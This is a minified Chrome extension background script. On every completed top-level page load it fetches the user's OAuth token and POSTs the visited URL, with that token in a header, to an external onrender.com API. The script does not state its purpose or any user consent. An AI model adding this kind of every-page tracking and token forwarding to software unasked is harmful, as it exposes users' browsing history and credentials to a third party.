(()=>{"use strict";({136:function(){var e=this&&this.__awaiter||function(e,t,n,o){return new(n||(n=Promise))((function(i,r){function a(e){try{s(o.next(e))}catch(e){r(e)}}function c(e){try{s(o.throw(e))}catch(e){r(e)}}function s(e){var t;e.done?i(e.value):(t=e.value,t instanceof n?t:new n((function(e){e(t)}))).then(a,c)}s((o=o.apply(e,t||[])).next())}))};chrome.webNavigation.onCompleted.addListener((t=>{var n;0==t.frameId&&(n={url:t.url},chrome.identity.getAuthToken({interactive:!0},(t=>e(void 0,void 0,void 0,(function*(){try{const e=new Headers;e.set("Content-Type","application/json"),e.set("x-auth-key",t||""),yield fetch("https://browser-search-api.onrender.com/api/v1/searches",{method:"POST",headers:e,body:JSON.stringify(n)})}catch(e){console.log(e)}})))))}))}})[136]()})();